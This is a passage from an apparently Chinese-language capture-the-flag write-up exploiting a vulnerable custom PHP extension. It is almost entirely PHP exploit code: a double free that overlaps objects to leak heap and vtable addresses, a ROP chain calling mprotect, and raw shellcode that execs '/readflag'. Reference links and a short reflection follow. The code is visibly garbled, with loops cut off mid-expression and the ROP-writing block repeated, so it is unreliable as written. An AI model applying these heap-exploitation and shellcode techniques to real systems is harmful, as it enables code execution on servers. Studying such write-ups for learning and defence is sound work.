       if (intval($data) == intval($ret_main_target) ) {
          echo "found!";
          break;
       }
       $offset--;
    }
然后就是写入ROP了，不知道为何，不能封装为函数，否则会写入失败。
    for ($j=0;$j> 0x8;
    }
    $offset += 0x8;
    $data = 0x1000;
    for ($j=0;$j> 0x8;
    }
    $offset += 0x10;
    for ($j=0;$j> 0x8;
    }
    $offset += 0x8;
    $data = 0x7;
    for ($j=0;$j> 0x8;
    }
    $offset += 0x10;
    for ($j=0;$j> 0x8;
    }
    $offset += 8;
    $stack_addr = $offset + ($oob_self_obj_addr + 0x18);
    $data = $stack_addr ^ ($stack_addr & 0xfff);
    for ($j=0;$j> 0x8;
    }
    $offset += 8;
    $data = $mprotect_addr;
    for ($j=0;$j> 0x8;
    }
    $offset += 8;
    $data = $stack_addr+0x18;
    for ($j=0;$j> 0x8;
    }
    $stack_addr += 0x18;
    $offset += 0x8;
    $shellcode = "\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05";
    $len = strlen($shellcode);
    //写shellcode
    for ($j=0;$j=0;$i-=2) {
          $ans = $ans . substr($s,$i,2);
       }
       return intval($ans,16);
    }
    function p32($val) {
       $s = dechex($val);
       $len = strlen($s);
       $ans = "";
       for ($i=$len-2;$i>=0;$i-=2) {
          $ans = $ans . substr($s,$i,2);
       }
       return hex2bin($ans);
    }
    //double free
    hackphp_create(56);
    hackphp_delete();
    //$x and $dv now has same address
    $x = str_repeat("D",0x18);
    $dv = new DateInterval('P1Y');
    $dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);
    echo sprintf("dv_vatble=0x%lx",$dv_vtable_addr);
    echo  "\n";
    $dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;
    echo sprintf("dv_self_obj_addr=0x%lx",$dv_self_obj_addr);
    echo "\n";
    hackphp_create(0x60);
    $oob = str_repeat("D",0x40);
    hackphp_edit("\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff/readflag\x00");
    $oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;
    echo sprintf("oob_self_obj_addr=0x%lx",$oob_self_obj_addr);
    echo "\n";
    $offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);
    function read64($oob,$addr) {
       /*if ($addr > 0x8;
    }
    $offset += 0x8;
    $data = 0x1000;
    for ($j=0;$j> 0x8;
    }
    $offset += 0x10;
    for ($j=0;$j> 0x8;
    }
    $offset += 0x8;
    $data = 0x7;
    for ($j=0;$j> 0x8;
    }
    $offset += 0x10;
    for ($j=0;$j> 0x8;
    }
    $offset += 8;
    $stack_addr = $offset + ($oob_self_obj_addr + 0x18);
    $data = $stack_addr ^ ($stack_addr & 0xfff);
    for ($j=0;$j> 0x8;
    }
    $offset += 8;
    $data = $mprotect_addr;
    for ($j=0;$j> 0x8;
    }
    $offset += 8;
    $data = $stack_addr+0x18;
    for ($j=0;$j> 0x8;
    }
    $stack_addr += 0x18;
    $offset += 0x8;
    $shellcode = "\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05";
    $len = strlen($shellcode);
    //写shellcode
    for ($j=0;$j
## 0x04 感想
第一次接触WEB PWN，突然觉得php语言的模块功能好灵活方便，WEB PWN也挺有趣。
## 0x05 参考链接
[ PHP 内核与扩展开发系列] PHP 生命周期 ——
启动、终止与模式](https://laravelacademy.org/post/7152.html)  
[PHP扩展之PHP的启动和停止](https://www.ligphp.com/post/75.html)  
[php7扩展开发 一 获取参数](https://www.cnblogs.com/dearmrli/p/6553542.html)  
[php-src](https://github.com/php/php-src/blob/ef5164818576d75929834d9f0c15cdfc095f7139/ext/opcache/jit/zend_jit_helpers.c)  
[PHP7 Memory
Exploitation](https://paper.seebug.org/papers/Security%20Conf/Hitcon/Hitcon-2016/1201%20R2%201500%20exploiting%20php7.pdf)